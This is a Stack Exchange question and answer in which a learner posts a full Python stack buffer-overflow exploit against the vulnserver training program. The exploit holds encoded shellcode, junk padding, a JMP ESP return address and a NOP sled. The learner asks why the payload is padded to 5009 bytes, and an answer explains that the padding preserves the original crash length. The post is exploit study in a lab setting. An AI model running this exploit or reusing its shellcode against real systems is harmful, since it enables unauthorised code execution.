{
    "title": "reason of padding in exploit",
    "link": "https://reverseengineering.stackexchange.com/questions/25672/reason-of-padding-in-exploit",
    "content": "I  was doing vulnserver bufferflow exploit. I saw a tutorial where the he makes a payload to exploit the server.\nTake a look at the exploit:\n<pre><code>#!/usr/bin/python\n\nimport socket\n\n\ntarget_ip = \"10.0.2.4\"\n\nport = 9999\n\n\nshellcode =  \"\"\nshellcode += \"\\xda\\xcd\\xbf\\x6f\\x21\\x1b\\xab\\xd9\\x74\\x24\\xf4\\x58\\x2b\"\nshellcode += \"\\xc9\\xb1\\x52\\x31\\x78\\x17\\x83\\xc0\\x04\\x03\\x17\\x32\\xf9\"\nshellcode += \"\\x5e\\x1b\\xdc\\x7f\\xa0\\xe3\\x1d\\xe0\\x28\\x06\\x2c\\x20\\x4e\"\nshellcode += \"\\x43\\x1f\\x90\\x04\\x01\\xac\\x5b\\x48\\xb1\\x27\\x29\\x45\\xb6\"\nshellcode += \"\\x80\\x84\\xb3\\xf9\\x11\\xb4\\x80\\x98\\x91\\xc7\\xd4\\x7a\\xab\"\nshellcode += \"\\x07\\x29\\x7b\\xec\\x7a\\xc0\\x29\\xa5\\xf1\\x77\\xdd\\xc2\\x4c\"\nshellcode += \"\\x44\\x56\\x98\\x41\\xcc\\x8b\\x69\\x63\\xfd\\x1a\\xe1\\x3a\\xdd\"\nshellcode += \"\\x9d\\x26\\x37\\x54\\x85\\x2b\\x72\\x2e\\x3e\\x9f\\x08\\xb1\\x96\"\nshellcode += \"\\xd1\\xf1\\x1e\\xd7\\xdd\\x03\\x5e\\x10\\xd9\\xfb\\x15\\x68\\x19\"\nshellcode += \"\\x81\\x2d\\xaf\\x63\\x5d\\xbb\\x2b\\xc3\\x16\\x1b\\x97\\xf5\\xfb\"\nshellcode += \"\\xfa\\x5c\\xf9\\xb0\\x89\\x3a\\x1e\\x46\\x5d\\x31\\x1a\\xc3\\x60\"\nshellcode += \"\\x95\\xaa\\x97\\x46\\x31\\xf6\\x4c\\xe6\\x60\\x52\\x22\\x17\\x72\"\nshellcode += \"\\x3d\\x9b\\xbd\\xf9\\xd0\\xc8\\xcf\\xa0\\xbc\\x3d\\xe2\\x5a\\x3d\"\nshellcode += \"\\x2a\\x75\\x29\\x0f\\xf5\\x2d\\xa5\\x23\\x7e\\xe8\\x32\\x43\\x55\"\nshellcode += \"\\x4c\\xac\\xba\\x56\\xad\\xe5\\x78\\x02\\xfd\\x9d\\xa9\\x2b\\x96\"\nshellcode += \"\\x5d\\x55\\xfe\\x39\\x0d\\xf9\\x51\\xfa\\xfd\\xb9\\x01\\x92\\x17\"\nshellcode += \"\\x36\\x7d\\x82\\x18\\x9c\\x16\\x29\\xe3\\x77\\x13\\xae\\xe9\\x82\"\nshellcode += \"\\x4b\\xac\\xed\\xaf\\xa2\\x39\\x0b\\xc5\\xa4\\x6f\\x84\\x72\\x5c\"\nshellcode += \"\\x2a\\x5e\\xe2\\xa1\\xe0\\x1b\\x24\\x29\\x07\\xdc\\xeb\\xda\\x62\"\nshellcode += \"\\xce\\x9c\\x2a\\x39\\xac\\x0b\\x34\\x97\\xd8\\xd0\\xa7\\x7c\\x18\"\nshellcode += \"\\x9e\\xdb\\x2a\\x4f\\xf7\\x2a\\x23\\x05\\xe5\\x15\\x9d\\x3b\\xf4\"\nshellcode += \"\\xc0\\xe6\\xff\\x23\\x31\\xe8\\xfe\\xa6\\x0d\\xce\\x10\\x7f\\x8d\"\nshellcode += \"\\x4a\\x44\\x2f\\xd8\\x04\\x32\\x89\\xb2\\xe6\\xec\\x43\\x68\\xa1\"\nshellcode += \"\\x78\\x15\\x42\\x72\\xfe\\x1a\\x8f\\x04\\x1e\\xaa\\x66\\x51\\x21\"\nshellcode += \"\\x03\\xef\\x55\\x5a\\x79\\x8f\\x9a\\xb1\\x39\\xaf\\x78\\x13\\x34\"\nshellcode += \"\\x58\\x25\\xf6\\xf5\\x05\\xd6\\x2d\\x39\\x30\\x55\\xc7\\xc2\\xc7\"\nshellcode += \"\\x45\\xa2\\xc7\\x8c\\xc1\\x5f\\xba\\x9d\\xa7\\x5f\\x69\\x9d\\xed\"\n\npayload =\"TRUN /.:/\"\npayload += 2003 * \"A\" #junk\npayload += \"\\xc7\\x11\\x50\\x62\" # 0x625011c7 -> JMP ESP\npayload += 40 * \"\\x90\" #nopsled\npayload += shellcode\npayload += (5009 - len(payload)) * \"C\"\n\n\ntry:\n        \n    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((target_ip,port))\n    s.send(payload)\n    print \"[+] \" + str(len(payload)) + \" Bytes Sent\"\n    \nexcept:\n    print \"[-] Crashed\"\n</code></pre>\nI can clearly understand that he made a padding(\"A\"*2003) to overwrite the stack. but I didn't understand the arithmetic operation he did in the following line.\n<pre><code>payload += (5009 - len(payload)) * \"C\"\n</code></pre>\nwhy does he have to do this. exploit is working without it. what is 5009 here?\nPlease tell me if you know. by the way, Article--> HERE\n",
    "votes": "3",
    "answers": 1,
    "views": "278",
    "tags": [
        "disassembly",
        "windows",
        "python",
        "stack"
    ],
    "user": "lucky thandel",
    "time": "Aug 14, 2020 at 11:55",
    "comments": [],
    "answers_data": [
        {
            "content": "The autor started with <pre><code>5009</code></pre> bytes (<pre><code>\"TRUN /.:/\" + 5000 * 'A'</code></pre>) so later when the actual shell code was added to the payload, the code (<pre><code>(5009 - len(payload)) * \"C\"</code></pre>) is added to maintain the original length of the payload that caused the crash.\nIf it works without - great, but why add additional variable/unknown to the pwning equation if you know that this length (<pre><code>5009</code></pre>) of data does work.\n",
            "votes": "1",
            "user": "Paweł Łukasik",
            "time": "Aug 20, 2020 at 8:17",
            "is_accepted": false,
            "comments": [
                {
                    "user": "lucky thandel",
                    "text": "<span class=\"comment-copy\">Can you please provide me some resource on the internet to read the explanation?</span>",
                    "time": null
                },
                {
                    "user": "Paweł Łukasik",
                    "text": "<span class=\"comment-copy\">what kind of explanation you expect?</span>",
                    "time": null
                },
                {
                    "user": "lucky thandel",
                    "text": "<span class=\"comment-copy\">Like a particle one, where someone actually uses this technique and exploit a buff overflow vulnerability.</span>",
                    "time": null
                },
                {
                    "user": "Paweł Łukasik",
                    "text": "<span class=\"comment-copy\">It's just a matter to fill up the buffer to the original size. There's nothing fancy here.</span>",
                    "time": null
                },
                {
                    "user": "fpmurphy",
                    "text": "<span class=\"comment-copy\">\"The autor started with 5009 bytes (\"TRUN /.:/\" + 5000 * 'A')\" is incorrect.  The author started with <code>2012</code> bytes, i.e. <code>\"TRUN /.:/\" + 2003 * 'A'</code></span>",
                    "time": null
                }
            ]
        }
    ]
}